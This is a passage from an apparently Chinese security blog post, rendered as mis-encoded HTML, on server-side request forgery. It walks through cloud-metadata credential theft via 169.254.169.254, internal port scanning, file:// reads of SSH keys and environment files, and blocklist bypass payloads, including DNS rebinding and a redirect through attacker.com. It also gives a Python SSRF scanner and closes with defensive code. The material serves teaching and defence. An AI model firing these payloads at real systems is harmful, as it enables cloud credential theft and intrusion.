+<p><code style="background: rgba(245, 245, 245, 1); padding: 1px 5px; border-radius: 3px; font-size: 0.9em; color: rgba(214, 51, 132, 1)">169.254.169.254</code> æ¯ææäºååç<strong>åæ°æ®æå¡ç«¯ç¹</strong>ãåªè¦åç«¯æå¡å¨å¨äºä¸è·ï¼è¿ä¸ªè¯·æ±å°±è½è¿åè¯¥æå¡å¨çä¸´æ¶å­è¯ã</p>
+<p>ç»æï¼è¯¥APIç´æ¥è¿åäº <code style="background: rgba(245, 245, 245, 1); padding: 1px 5px; border-radius: 3px; font-size: 0.9em; color: rgba(214, 51, 132, 1)">aliyun-access-key-id</code>ã<code style="background: rgba(245, 245, 245, 1); padding: 1px 5px; border-radius: 3px; font-size: 0.9em; color: rgba(214, 51, 132, 1)">access-key-secret</code> å <code style="background: rgba(245, 245, 245, 1); padding: 1px 5px; border-radius: 3px; font-size: 0.9em; color: rgba(214, 51, 132, 1)">security-token</code>ã</p>
+<p>æäºè¿ä¸æ ·ï¼æ»å»èå¯ä»¥å¨äºååAPIä¸­<strong>ä»¥è¯¥æå¡å¨çèº«ä»½æ§è¡ä»»ä½æä½</strong>ââåå»ºECSãä¸è½½OSSæä»¶ãçè³éç½®ç½ç»è§åã</p>
+<p>è¿å°±æ¯SSRFæç»å¸çæä¼¤è·¯å¾ï¼<strong>å¤é¨å¯æ§URL â åç½æ¢æµ â äºåæ°æ®çªå â æ¨ªåç§»å¨</strong>ã</p>
+<p>é£æä»¬æ¥ççæ»å»èå·ä½æä¹ç©ã</p>
+<h2 style="font-size: 20px; color: rgba(26, 26, 46, 1); margin-top: 32px; margin-bottom: 12px; border-left: 3px solid rgba(255, 107, 53, 1); padding-left: 10px">SSRFçä¸ç§å¸¸è§åºæ¯</h2>
+<h3 style="font-size: 17px; color: rgba(51, 51, 51, 1); margin-top: 24px; margin-bottom: 8px; font-weight: 600">1. åç½ç«¯å£æ«æ</h3>
+<p>SSRFæå¸¸è§çç¨æ³æ¯æ¢æµåç½ãæ»å»èæé ä¸ä¸ªå¾ªç¯ï¼æ¨ä¸ªæ«æåç½IPåç«¯å£ï¼</p>
+<pre><code class="language-bash"># éååç½Cæ®µ
+for ip in 10.0.0.{1..254}; do
+  for port in 22 80 443 3306 6379 8080 9200; do
+    curl "http://target.com/fetch?url=http://$ip:$port/"
+  done
+done</code></pre>
+<p>éè¿ååºæ¶é´å·®ãè¿ååå®¹ãç¶æç æ¥å¤æ­ç«¯å£æ¯å¦å¼æ¾ãå¦æè¿åäºæäºæå¡çBannerï¼é£ç´æ¥åæåç½èµäº§ä¿¡æ¯ã</p>
+<p>å®éåºæ¯ä¸­æè¿è§è¿æ´ç çââæ»å»èä¸æ¯æå¨æ«ï¼èæ¯ç¨èæ¬éåBurp SuiteçIntruderï¼ä¸ä¸ªæ¥å£10åéå°±æ«å®æ´ä¸ªåç½ã</p>
+<h3 style="font-size: 17px; color: rgba(51, 51, 51, 1); margin-top: 24px; margin-bottom: 8px; font-weight: 600">2. äºåæ°æ®æ»å»</h3>
+<p>åé¢æå°çåæ°æ®ç«¯ç¹ï¼åäºååå°åä¸åï¼</p>
+äºåååæ°æ®ç«¯ç¹AWShttp://169.254.169.254/latest/meta-data/é¿éäºhttp://100.100.100.200/latest/meta-data/è¾è®¯äºhttp://metadata.tencentyun.com/latest/meta-data/åä¸ºäºhttp://169.254.169.254/openstack/latest/GCPhttp://metadata.google.internal/computeMetadata/v1/
+<p>æ»å»èæ¿å°å­è¯åï¼éå¸¸æ§è¡ä»¥ä¸æä½ï¼</p>
+<pre><code class="language-bash"># 1. è·åRAMè§è²åç§°
+curl http://169.254.169.254/latest/meta-data/ram/security-credentials/
+
+# 2. è·åä¸´æ¶å­è¯
+curl http://169.254.169.254/latest/meta-data/ram/security-credentials/ecs-role
+
+# 3. ç¨å­è¯æä½äºAPI
+aliyun ecs DescribeInstances --region cn-hangzhou \
+  --access-key-id &lt;STS.xxx&gt; \
+  --access-key-secret &lt;xxx&gt; \
+  --security-token &lt;xxx&gt;</code></pre>
+<h3 style="font-size: 17px; color: rgba(51, 51, 51, 1); margin-top: 24px; margin-bottom: 8px; font-weight: 600">3. æä»¶åè®®è¯»å</h3>
+<p>æäºæå¡ç«¯ä¸ä»æ¯æHTTPï¼è¿æ¯æ <code style="background: rgba(245, 245, 245, 1); padding: 1px 5px; border-radius: 3px; font-size: 0.9em; color: rgba(214, 51, 132, 1)">file://</code> åè®®ï¼</p>
+<pre><code class="language-python">import requests
+# æ¼æ´ä»£ç ï¼æªéå¶åè®®ç±»å
+def read_resource(url):
+    if url.startswith('http'):
+        return requests.get(url).text
+    # ä½æ¯æ file://
+    return open(url.replace('file://', '')).read()</code></pre>
+<p>æ»å»èå¯ä»¥æé ï¼</p>
+<pre><code>file:///etc/passwd
+file:///proc/self/environ    # ç¯å¢åéï¼å¯è½æ³é²æ°æ®åºå¯ç 
+file:///proc/self/fd/1       # æ¥å¿æä»¶ï¼å¯»æ¾ææä¿¡æ¯
+file:///root/.ssh/id_rsa     # SSHå¯é¥</code></pre>
+<h2 style="font-size: 20px; color: rgba(26, 26, 46, 1); margin-top: 32px; margin-bottom: 12px; border-left: 3px solid rgba(255, 107, 53, 1); padding-left: 10px">SSRFç»è¿ææ³å¤§å¨ï¼æ»å»èè§è§ï¼</h2>
+<p>é²å¾¡æ¹æå¸¸è§çåæ³æ¯ãé»ååIPãæãç½ååååããç¶èâ¦æ¯ç§æ¹æ¡é½æå¯¹åºçç»è¿æ¹å¼ã</p>
+<h3 style="font-size: 17px; color: rgba(51, 51, 51, 1); margin-top: 24px; margin-bottom: 8px; font-weight: 600">ç»è¿IPé»åå</h3>
+<p>ä½ ä»¥ä¸ºç¦æ­¢äº <code style="background: rgba(245, 245, 245, 1); padding: 1px 5px; border-radius: 3px; font-size: 0.9em; color: rgba(214, 51, 132, 1)">127.0.0.1</code> å°±å®å¨äºï¼</p>
+<pre><code class="language-bash"># åè¿å¶IP
+http://2130706433/             # ç­ä»·äº 127.0.0.1
+http://0x7f000001/             # åå­è¿å¶
+http://0x7f.0x0.0x0.0x1/      # æ··åè¿å¶
+
+# ç­æ ¼å¼
+http://127.1/                  # ç­ä»· 127.0.0.1
+http://0/                      # ç­ä»· 0.0.0.0
+
+# IPv6æ å°
+http://[::1]/                  # localhostçIPv6
+http://[0:0:0:0:0:ffff:127.0.0.1]/
+
+# DNSéç»å®ï¼ç»å¸çSSRFç»è¿å¤§æ³ï¼
+# æ³¨åä¸ä¸ªååï¼ç¬¬ä¸æ¬¡è§£æå°åæ³IPï¼ç¬¬äºæ¬¡è§£æå°åç½IP
+http://ssrf-bind.example.com/</code></pre>
+<p><strong>DNSéç»å®</strong>æ¯æéªçç»è¿æ¹å¼ãåçå¾ç®åï¼æ»å»èæ³¨åä¸ä¸ªååï¼éç½®æç­çTTLï¼æ¯å¦1ç§ï¼ï¼è®©ååå¨ä¸¤ä¸ªIPä¹é´æ¥ååæ¢ãç¬¬ä¸æ¬¡DNSæ¥è¯¢è¿ååæ³IPï¼éè¿ç½ååæ£æ¥ï¼ï¼ç¬¬äºæ¬¡æ¥è¯¢ï¼åèµ·å®éè¯·æ±æ¶ï¼è¿ååç½IPã</p>
+<p>æåè¿ä¸ä¸ªå°å·¥å·æ¼ç¤ºè¿ä¸ªè¿ç¨ï¼</p>
+<pre><code class="language-python">import socket
+import time
+
+# æ¨¡æDNSéç»å®æ»å»
+domain = "evil.dnsrebind.example.com"
+real_ip = socket.gethostbyname(domain)
+# ç¬¬ä¸æ¬¡æ¥è¯¢ï¼è¿å8.8.8.8ï¼çèµ·æ¥å®å¨ï¼
+print(f"ç¬¬ä¸æ¬¡è§£æ: {real_ip}")
+
+# ç­å¾TTLè¿æï¼éå¸¸è®¾1-5ç§ï¼
+time.sleep(2)
+
+# ç¬¬äºæ¬¡æ¥è¯¢ï¼è¿å10.0.0.1ï¼åç½å°åï¼
+rebound_ip = socket.gethostbyname(domain)
+print(f"ç¬¬äºæ¬¡è§£æ: {rebound_ip}")</code></pre>
+<h3 style="font-size: 17px; color: rgba(51, 51, 51, 1); margin-top: 24px; margin-bottom: 8px; font-weight: 600">ç»è¿URLè§£æå·®å¼</h3>
+<p>å¾å¤é²å¾¡æ¹æ¡ç¨ <code style="background: rgba(245, 245, 245, 1); padding: 1px 5px; border-radius: 3px; font-size: 0.9em; color: rgba(214, 51, 132, 1)">urllib.parse</code> æ¥è§£æURLåæ ¡éªï¼ä½åèµ·è¯·æ±æ¶ç¨çå´æ¯ <code style="background: rgba(245, 245, 245, 1); padding: 1px 5px; border-radius: 3px; font-size: 0.9em; color: rgba(214, 51, 132, 1)">requests</code> æ <code style="background: rgba(245, 245, 245, 1); padding: 1px 5px; border-radius: 3px; font-size: 0.9em; color: rgba(214, 51, 132, 1)">curl</code>ãè¿ä¸¤ä¸ªåºçURLè§£æé»è¾æå·®å¼ï¼æ»å»èå¯ä»¥å©ç¨è¿ä¸ç¹ã</p>
+<pre><code class="language-python"># é²å¾¡æ¹æ ¡éªï¼ç¨urllibï¼
+parsed = urllib.parse.urlparse(url)
+# parsed.hostname = "baidu.com"  â çèµ·æ¥æ²¡é®é¢
+
+# å®éè¯·æ±ç¨ï¼ç¨requestsï¼
+# å®éè¯·æ±å»äº http://10.0.0.1:80/</code></pre>
+<p>æé æ¹å¼ç¤ºä¾ï¼</p>
+<pre><code class="language-bash"># å©ç¨@ç¬¦å·è§£æå·®å¼
+http://baidu.com@10.0.0.1:80/admin
+
+# å©ç¨#ç¬¦å·æªæ­
+http://10.0.0.1:80#@baidu.com
+
+# å©ç¨DNSå½åè§èï¼ä¸åçº¿å¨æäºå®ç°ä¸­è¢«å¿½ç¥ï¼
+http://baidu_com.10.0.0.1/
+
+# URLç¼ç 
+http://127.0.0.1%2f%2f%2fbaidu.com</code></pre>
+<h3 style="font-size: 17px; color: rgba(51, 51, 51, 1); margin-top: 24px; margin-bottom: 8px; font-weight: 600">ç»è¿302è·³è½¬</h3>
+<p>æäºç³»ç»ä¼æ£æ¥ç®æ URLæ¯å¦å¨ç½åååï¼ä½æ»å»èå¯ä»¥æé ä¸ä¸ªãä¸­é´äººãååï¼</p>
+<pre><code class="language-bash"># æ»å»èæ­å»ºä¸ä¸ªæå¡å¨
+# ç¬¬ä¸æ¬¡è¯·æ± â è¿å302è·³è½¬å°åç½å°å
+curl "http://target.com/fetch?url=http://attacker.com/redirect"
+# è·³è½¬å° http://169.254.169.254/latest/meta-data/</code></pre>
+<p>å¦æåç«¯ä¸æ£æ¥è·³è½¬ç®æ ï¼<code style="background: rgba(245, 245, 245, 1); padding: 1px 5px; border-radius: 3px; font-size: 0.9em; color: rgba(214, 51, 132, 1)">allow_redirects=True</code>ï¼ï¼è¿å°±æ¯ä¸ä¸ªç»å¸çSSRFå©ç¨æ¹å¼ã</p>
+<h2 style="font-size: 20px; color: rgba(26, 26, 46, 1); margin-top: 32px; margin-bottom: 12px; border-left: 3px solid rgba(255, 107, 53, 1); padding-left: 10px">å®æä»£ç ï¼SSRFæ¼æ´æ£æµå·¥å·</h2>
+<p>ä¸é¢æ¯æå¨å®æä¸­å¸¸ç¨çä¸æ¬¾è½»éæ£æµèæ¬ï¼Python3ï¼ï¼å¯ä»¥å¸®å©å¿«ééªè¯SSRFæ¯å¦å­å¨ï¼</p>
+<pre><code class="language-python">#!/usr/bin/env python3
+"""
+SSRFæ¼æ´å¿«ééªè¯å·¥å·
+ç¨æ³: python3 ssrf_check.py &lt;target_url&gt; &lt;param_name&gt;
+ç¤ºä¾: python3 ssrf_check.py "http://example.com/fetch" "url"
+"""
+
+import requests
+import sys
+import time
+from urllib.parse import urljoin
+
+# æµè¯Payloadåè¡¨
+PAYLOADS = {
+    "æ¬å°åç¯": [
+        "http://127.0.0.1:80/",
+        "http://localhost:80/",
+        "http://[::1]:80/",
+        "http://0:80/",
+        "http://0.0.0.0:80/",
+        "http://2130706433:80/",
+    ],
+    "äºåæ°æ®": [
+        "http://169.254.169.254/latest/meta-data/",
+        "http://100.100.100.200/latest/meta-data/",
+        "http://metadata.tencentyun.com/latest/meta-data/",
+    ],
+    "åç½å¸¸è§ç«¯å£": [
+        "http://172.16.0.1:22/",
+        "http://10.0.0.1:80/",
+        "http://192.168.1.1:3306/",
+        "http://10.0.0.1:6379/",
+        "http://10.0.0.1:9200/",
+        "http://10.0.0.1:27017/",
+    ],
+    "æä»¶è¯»å": [
+        "file:///etc/passwd",
+        "file:///proc/self/environ",
+    ],
+}
+
+def check_ssrf(base_url, param):
+    """
+    å¯¹æå®åæ°æ³¨å¥SSRFæµè¯payloadï¼æ ¹æ®ååºå¤æ­æ¯å¦å­å¨æ¼æ´
+    """
+    print(f"[*] ç®æ : {base_url}")
+    print(f"[*] åæ°: {param}")
+    print("=" * 60)
+
+    for category, urls in PAYLOADS.items():
+        print(f"\n[+] æµè¯ç±»å«: {category}")
+        for test_url in urls:
+            try:
+                params = {param: test_url}
+                start = time.time()
+                resp = requests.get(
+                    base_url, params=params, timeout=8, allow_redirects=False
+                )
+                elapsed = time.time() - start
+
+                # å¤æ­ä¾æ®ï¼
+                # 1. ç¶æç 200ä¸æååºä½ â å¯è½æ¯æå
+                # 2. ååºæ¶é´å¼å¸¸ï¼è¿æ¥è¶æ¶ææç»ï¼â ç«¯å£å¯è½å¼æ¾
+                # 3. ååºåå®¹åå«ç¹å®å­ç¬¦ä¸²
+                indicators = [
+                    resp.status_code == 200,
+                    elapsed &gt; 2,  # è¿æ¥æåä½æ²¡æ°æ®
+                    "root:" in resp.text,  # /etc/passwdç¹å¾
+                    "secret" in resp.text.lower(),
+                    "access-key" in resp.text.lower(),
+                ]
+
+                if any(indicators):
+                    print(f"  â ï¸  {test_url}")
+                    print(f"     ç¶æ: {resp.status_code}, èæ¶: {elapsed:.2f}s")
+                    if resp.text:
+                        preview = resp.text[:200].replace('\n', '\\n')
+                        print(f"     ååº: {preview}...")
+                else:
+                    print(f"  - {test_url} â {resp.status_code}")
+
+            except requests.exceptions.Timeout:
+                print(f"  â±  {test_url} â è¶æ¶ï¼å¯è½ç«¯å£å¼æ¾ï¼")
+            except requests.exceptions.ConnectionError:
+                print(f"  â {test_url} â è¿æ¥æç»")
+            except Exception as e:
+                print(f"  ! {test_url} â {e}")
+
+if __name__ == "__main__":
+    if len(sys.argv) &lt; 3:
+        print("ç¨æ³: python3 ssrf_check.py &lt;target_url&gt; &lt;param_name&gt;")
+        sys.exit(1)
+    check_ssrf(sys.argv[1], sys.argv[2])</code></pre>
+<p>è¿ä¸ªå·¥å·çé»è¾å¾ç®åââéåå¸¸è§çåç½IPãäºåæ°æ®ç«¯ç¹ãæä»¶åè®®URLï¼è§å¯ååºç¶æååå®¹æ¥å¤æ­æ¯å¦å­å¨SSRFã</p>
+<h2 style="font-size: 20px; color: rgba(26, 26, 46, 1); margin-top: 32px; margin-bottom: 12px; border-left: 3px solid rgba(255, 107, 53, 1); padding-left: 10px">æ­£ç¡®çé²å¾¡æ¹æ¡</h2>
+<p>è®²å®äºæ»å»ï¼æä»¬æ¥çé²å¾¡ãå¾å¤å¢éçæ¹æ¡æ¯ï¼</p>
+<blockquote style="border-left: 3px solid rgba(255, 107, 53, 1); padding: 10px 16px; background: rgba(250, 250, 250, 1); margin: 16px 0; color: rgba(85, 85, 85, 1)">ãç¦æ­¢æ <code style="background: rgba(245, 245, 245, 1); padding: 1px 5px; border-radius: 3px; font-size: 0.9em; color: rgba(214, 51, 132, 1)">127.0.0.1</code> å <code style="background: rgba(245, 245, 245, 1); padding: 1px 5px; border-radius: 3px; font-size: 0.9em; color: rgba(214, 51, 132, 1)">169.254.169.254</code> å°±è¡äºå§ï¼ã</blockquote>
+<p><strong>ä¸å¤ï¼è¿è¿ä¸å¤ã</strong> ä¸é¢é£äºç»è¿æ¹å¼éä¾¿ä¸ä¸ªå°±è½ç ´ã</p>
+<h3 style="font-size: 17px; color: rgba(51, 51, 51, 1); margin-top: 24px; margin-bottom: 8px; font-weight: 600">æ¨èé²å¾¡æ¹æ¡ï¼ææ¨èåº¦æåºï¼</h3>
+<p><strong>æ¹æ¡ä¸ï¼ä½¿ç¨ç½åå + URLè§£æåæ ¡éªï¼æ¨èï¼</strong></p>
+<pre><code class="language-python">import ipaddress
+from urllib.parse import urlparse
+
+ALLOWED_HOSTS = ["img.example.com", "cdn.example.com"]
+
+def safe_fetch(url):
+    parsed = urlparse(url)
+
+    # 1. åªåè®¸HTTP/HTTPSåè®®
+    if parsed.scheme not in ("http", "https"):
+        raise ValueError("ä¸æ¯æçåè®®")
+
+    # 2. åªåè®¸ç½åååå
+    if parsed.hostname not in ALLOWED_HOSTS:
+        raise ValueError("ååä¸å¨ç½ååå")
+
+    # 3. ç¡®ä¿ååè§£æå°å¬ç½IPï¼ä¸æ¯åç½IPï¼
+    try:
+        import socket
+        ip = socket.gethostbyname(parsed.hostname)
+        addr = ipaddress.ip_address(ip)
+        if addr.is_private or addr.is_loopback or addr.is_link_local:
+            raise ValueError("ç¦æ­¢è®¿é®åç½å°å")
+    except socket.gaierror:
+        raise ValueError("ååè§£æå¤±è´¥")
+
+    return requests.get(url, timeout=5, allow_redirects=False)</code></pre>
+<p><strong>æ¹æ¡äºï¼ä½¿ç¨æ ç½ç»æéçåç¬æå¡</strong></p>
+<p>æéè¦è¯·æ±å¤é¨URLçåè½æ¾å°ä¸ä¸ªç¬ç«çå®¹å¨æå½æ°ä¸­ï¼<strong>ä¸ç»å®ä»»ä½åç½æé</strong>ã</p>
+<pre><code class="language-yaml"># docker-compose ç¤ºä¾
+services:
+  image-fetcher:
+    build: ./fetcher
+    # å³é®ï¼åªç»å¬ç½è®¿é®ï¼ä¸ç»åç½æé
+    networks:
+      - external-only
+
+networks:
+  external-only:
+    internal: false  # ä¸è½è®¿é®åç½</code></pre>
+<p><strong>æ¹æ¡ä¸ï¼ç¦ç¨éå®å</strong></p>
+<pre><code class="language-python"># æç®æ´çé²å¾¡
+response = requests.get(url, timeout=5, allow_redirects=False)</code></pre>
+<p>å¦æä¸å¡éè¦éå®åï¼ä¸å®è¦<strong>éªè¯æç»è·³è½¬ç®æ </strong>ï¼</p>
+<pre><code class="language-python">response = requests.get(url, timeout=5, allow_redirects=True)
+final_url = response.url  # æç»è·³è½¬åçURL
+final_parsed = urlparse(final_url)
+# åæ¬¡æ ¡éª final_parsed.hostname</code></pre>
+<h2 style="font-size: 20px; color: rgba(26, 26, 46, 1); margin-top: 32px; margin-bottom: 12px; border-left: 3px solid rgba(255, 107, 53, 1); padding-left: 10px">æ»ç»</h2>
+<p>SSRFä¸æ¯æ°æ¼æ´ï¼ä½å®å¨äºåçæ¶ä»£æä¼¤åæ´å¢ââå ä¸ºä¸ååªæ¯æ«ä¸ªåç½ç«¯å£ï¼èæ¯è½ç´æ¥çªåäºè´¦æ·å­è¯ã</p>
+<p>ä½ä¸ºå®å¨ä»ä¸èï¼æç»å¤§å®¶å ä¸ªå»ºè®®ï¼</p>
+<ul style="margin: 8px 0; padding-left: 24px; line-height: 1.8">
+<li><strong>å«ä¿¡ç¨æ·è¾å¥çURL</strong>ââä¸ç®¡å®çèµ·æ¥å¤æ­£å¸¸</li>
+<li><strong>å«èªå·±åURLæ ¡éªé»è¾</strong>ââç¨æççåºï¼ä¸æ³¨æåºä¹é´çè§£æå·®å¼</li>
+<li><strong>ç½ç»éç¦»æ¯ä»£ç è¿æ»¤æ´å¯é </strong>ââå¦æå®¹å¨è¿ä¸ä¸åæ°æ®ï¼SSRFå°±åºäº</li>
+<li><strong>å®ææ£æ¥äºRAMè§è²æé</strong>ââæå°æéååï¼ä¸ä¸ªECSä¸éè¦åå»ºVPCçæé</li>
+</ul>
+<p>æåéä¸å¥è¯ï¼<strong>SSRFæå¥½çé²å¾¡ä¸æ¯é»ååï¼èæ¯ç½ç»å±é¢çéç¦»ã</strong></p>
+<p>ä½ çç³»ç»éææ²¡æç±»ä¼¼çãå¾çä¸è½½ããæä»¶å¯¼å¥ããWebhookåè°ãåè½ï¼å»æ£æ¥ä¸ä¸è¯·æ±ç®æ æ¯å¦å¯æ§ï¼è¯´ä¸å®è½åç°æåï¼æèæåï¼ã</p>
+<hr>
+<p><em>æ¬æç±å³æ³¨ãå®å¨å¼ç­å®¤ãå¬ä¼å·ï¼æ¯å¤©ä¸ç¯å®ææ»é²æ¡ä¾ã</em></p>
+<hr style="margin: 40px 0; border-top: 1px solid rgba(238, 238, 238, 1); border-right: none; border-bottom: none; border-left: none">
+<div style="display: flex; align-items: center; padding: 16px 20px; background: rgba(248, 249, 250, 1); border-radius: 10px; margin: 20px auto; gap: 16px; max-width: 460px">
+<div style="flex: 1">
+<p style="font-size: 16px; font-weight: bold; color: rgba(26, 26, 46, 1); margin: 0 0 4px">å³æ³¨ãå®å¨å¼ç­å®¤ãå¬ä¼å·</p>
+<p style="font-size: 13px; color: rgba(102, 102, 102, 1); margin: 0">å®ææ»é²æ¡ä¾ + å®å¨å¹²è´§</p>
+</div>
+<img alt="å³æ³¨å®å¨å¼ç­å®¤" style="width: 88px; height: 88px; border-radius: 6px; flex-shrink: 0" data-src="https://img2024.cnblogs.com/blog/1190569/202605/1190569-20260520131531982-231759831.jpg" class="lazyload"></div>
+</div>
+
+</div>
+<div class="clear"></div>
+
+        <p class="postfoot">
+            posted on 
+<span id="post-date" data-last-update-days="0" data-date-updated="2026-06-20 22:21">2026-06-20 22:21</span>&nbsp;
+<a href="https://www.cnblogs.com/mliu">æ.Sir</a>&nbsp;
+éè¯»(<span id="post_view_count">0</span>)&nbsp;
+è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
+&nbsp;
+<a href="javascript:void(0)" onclick="AddToWz(20631676);return false;">æ¶è</a>&nbsp;
+<a href="https://report.cnblogs.com?targetLink=https%3A%2F%2Fwww.cnblogs.com%2Fmliu%2Fp%2F20631676&amp;targetId=20631676&amp;targetType=0" target="_blank">ä¸¾æ¥</a>
+
+        </p>
+     ]]>
     </description>
     </item>
         </channel>
